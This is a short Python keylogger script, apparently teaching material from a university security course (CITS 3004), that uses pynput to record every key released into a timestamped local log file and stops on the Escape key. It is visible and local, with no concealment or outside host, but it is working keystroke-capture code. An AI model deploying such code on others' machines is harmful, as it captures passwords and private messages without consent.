# CITS 3004
# Name: Logger
# Authors: Other Lecturers and Alvaro Monsalve
# Last Update: 13 OCT 2021
# Requirements: Python 3.8

# Run with
""" cls && python3 keylog.py """

# Import libs
from pynput import keyboard
from datetime import datetime


# Get date timestamp
log_file_name = str(datetime.now())
log_file_name = log_file_name.replace(" ", "_").replace(":", "-")
log_file_name = "logs\\" + log_file_name + "_log.log"

# Open log file for appending
log_file = open(log_file_name, 'a+')


# Get key name from key
def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

# Callback function for each key press
def on_release(key):

    # Get key name
    key_name = get_key_name(key)

    # Get message
    msg = 'Pressed: {}'.format(key_name)

    # Print msg
    print(msg)

    # Save msg
    log_file.write("\n" + msg)

    # If exit signal given
    if key_name == 'Key.esc':

        # Close file
        log_file.close()

        # Notify
        print('Exiting...')

        # Return false
        return False


# Listen for keys
with keyboard.Listener(on_release = on_release) as listener:
    listener.join()